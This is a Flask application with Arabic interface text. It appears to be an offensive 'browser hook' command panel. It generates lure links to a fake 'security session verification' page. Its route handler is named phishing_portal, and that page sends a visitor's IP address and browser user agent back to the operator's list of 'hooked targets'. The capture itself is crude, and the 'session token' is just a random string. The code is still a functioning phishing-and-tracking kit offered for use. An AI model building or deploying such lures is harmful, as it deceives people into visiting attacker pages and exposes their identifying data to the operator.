from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

import asyncio
import random
import urllib3
import datetime
urllib3.disable_warnings()

# ذاكرة الميدان الاستراتيجية المركزية لخطافات المتصفح والجلسات الحية
CAPTURED_HOOKS = []
ACTIVE_SESSIONS = []

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - خطافات المتصفح المتقدمة v22.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
input:focus, select:focus{box-shadow:0 0 30px #ff0040}
button{padding:16px 35px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:16px;margin-top:10px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 40px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:12px;border:1px solid #1a2a40;font-size:14px}
th{background:#0a0e1a;color:#ff0040}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - خطافات المتصفح v22.0 ⚔️</h1>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_HOOK_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_browser_hook_lure">توليد رابط خطاف المتصفح الحي (Live Browser Hook Lure)</option>
  <option value="fetch_hooked_targets">استعراض متصفحات الأهداف الخطافية (Active Hooked Sessions)</option>
  <option value="audit_hooks">فحص جاهزية محرك الاتصال الثنائي</option>
</select>
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر خطافات المتصفح 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري تفعيل خطافات المتصفح... ⚡';
 status.textContent='⏳ جارٍ تنفيذ العمليات التكتيكية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(cmdType === 'fetch_hooked_targets'){
     if(!data.logs || data.logs.length === 0){
       results.innerHTML='<div class="card Low"><b>لا توجد متصفحات مخترقة مرتبطة حتى الآن</b><div class="proof">No hooked browser sessions active in memory.</div></div>';
     } else {
       let tableHtml = '<div class="card Critical"><b>🎯 سجلات متصفحات الأهداف المرتبطة</b><table><tr><th>المتصفح / النظام</th><th>توكن الجلسة (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
       data.logs.forEach(l => {
         tableHtml += `<tr><td>${l.agent}</td><td style="color:#00ff88">${l.token}</td><td>${l.ip}</td><td>${l.time}</td></tr>`;
       });
       tableHtml += '</table></div>';
       results.innerHTML = tableHtml;
     }
   } else {
     if(!data.actions || data.actions.length==0){
       results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No vectors returned.</div></div>';
     } else {
       data.actions.forEach(v=>{
         results.innerHTML+=`
         <div class="card ${v.severity || 'Low'}">
           <b>⚡ ${v.type}</b>
           <div style="margin:8px 0">${v.desc}</div>
           <div class="proof">${v.proof}</div>
         </div>`;
       });
     }
   }
 }catch(e){
   status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
 }
 btn.disabled=false; btn.textContent='تنفيذ أمر خطافات المتصفح 🚀';
}
</script>
</html>"""

HOOKED_PORTAL_TEMPLATE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة التحقق الميداني والاتصال الحي</title>
<style>
body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
h2{color:#00ff88;text-align:center;margin-bottom:20px}
button{width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:5px;font-weight:bold;cursor:pointer;margin-top:15px;font-size:16px}
button:hover{background:#00cc6a}
</style>
</head>
<body>
<div class="box">
  <h2>جلسة مؤمنة بالخطاف الحي</h2>
  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ مزامنة الجلسة الأمنية لمتصفحك...</p>
  <button onclick="triggerHookSession()">تأكيد واستمرار الاتصال</button>
</div>

<script>
function triggerHookSession(){
    const token = 'hook_token_' + Math.random().toString(36).substring(2, 12);
    fetch('/auth/verify/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent})
    }).then(res => res.text()).then(html => {
        document.body.innerHTML = '<div style="background:#000;color:#00ff88;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم ربط خطاف المتصفح بنجاح يا فندم! ⚔️</h2><p>Token: ' + token + '</p></div>';
    });
}
</script>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

@app.route('/', methods=['GET'])
def home():
    return HTML_COMMAND_CENTER

@app.route('/auth/verify/login', methods=['GET', 'POST'])
def phishing_portal():
    if request.method == 'POST':
        req_data = request.get_json(silent=True) or {}
        hook_token = req_data.get('session_token', 'N/A')
        user_agent = req_data.get('user_agent', 'Unknown Browser')
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        CAPTURED_HOOKS.append({
            "agent": user_agent[:45] + "...",
            "token": hook_token,
            "ip": client_ip,
            "time": timestamp
        })
        return jsonify({"status": "hooked", "token": hook_token})
        
    return HOOKED_PORTAL_TEMPLATE

@app.route('/api/index', methods=['POST'])
def check():
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    command_mode = req_data.get("command", "generate_browser_hook_lure")
    
    actions = []
    waf_status = f"v22.0 Browser Hook Engine ({command_mode})"
    
    if command_mode == "generate_browser_hook_lure":
        hook_lure_url = f"{target}/auth/verify/login?token=hook_active_session_99"
        actions.append({
            "type": "LIVE BROWSER HOOK LURE URL",
            "severity": "Critical",
            "desc": "تم توليد رابط خطاف المتصفح الحي المرتبط بغرفة العمليات.",
            "proof": hook_lure_url
        })
    elif command_mode == "fetch_hooked_targets":
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
    else:
        actions.append({
            "type": "HOOK ENGINE AUDIT PASSED",
            "severity": "Low",
            "desc": "محرك خطافات المتصفح يعمل بكفاءة تامة.",
            "proof": f"Target: {target} | Active Hooks: {len(CAPTURED_HOOKS)}"
        })

    return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
